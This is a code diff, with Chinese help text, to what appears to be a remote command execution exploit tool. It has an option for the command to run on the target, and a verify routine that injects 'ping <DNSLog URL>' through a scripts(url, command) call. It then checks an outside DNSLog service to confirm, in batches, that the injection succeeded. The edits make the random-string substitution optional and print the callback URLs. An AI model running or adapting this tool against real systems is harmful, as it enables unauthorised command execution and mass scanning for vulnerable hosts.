@@ -24,10 +24,14 @@ def verify(url, dnslog_url='{randstr}',
            check_dnslog_url='{randstr}', dns_log_flag=''):
     # 增加可选的验证功能，使用DNSLog验证，方便批量验证。
     randstr = ''.join(random.sample(string.ascii_letters, 8))
-    check_dnslog_url = check_dnslog_url.format(randstr=randstr)
-    dnslog_url = dnslog_url.format(randstr=randstr)
+    if '{randstr}' in check_dnslog_url:
+        check_dnslog_url = check_dnslog_url.format(randstr=randstr)
+    if '{randstr}' in dnslog_url:
+        dnslog_url = dnslog_url.format(randstr=randstr)
     dnslog_command = "ping {dnslog_url}".format(dnslog_url=dnslog_url)
     scripts(url, dnslog_command)
+    print('DNSLOG: {}'.format(dnslog_url))
+    print('CHECK DNSlog: {}'.format(check_dnslog_url))
     try:
         resp = requests.get(check_dnslog_url)
         if dns_log_flag in resp.text:
@@ -47,9 +51,9 @@ if __name__ == '__main__':
     parse.add_argument('-c', '--command', help='要执行的命令。', action='store')
     parse.add_argument('-v', '--verify', help='使用DNSLog验证。', action='store_true')
     parse.add_argument('--output', help='输出到文件，文件不存在会自动创建。', action='store')
-    parse.add_argument('--dnslog', help='包含{randstr}的字符串，randstr会被format。', action='store')
+    parse.add_argument('--dnslog', help='待触发的DNSlog URL，若存在{randstr}会被format。', action='store')
     parse.add_argument('--flag', help='DNSlog检查页面包含的关键词。', action='store')
-    parse.add_argument('--check_dnslog', help='包含{randstr}的字符串，randstr会被format。', action='store')
+    parse.add_argument('--check_dnslog', help='检查DNSlog是否触发，若存在{randstr}会被format。', action='store')
 
     options = parse.parse_args()
 
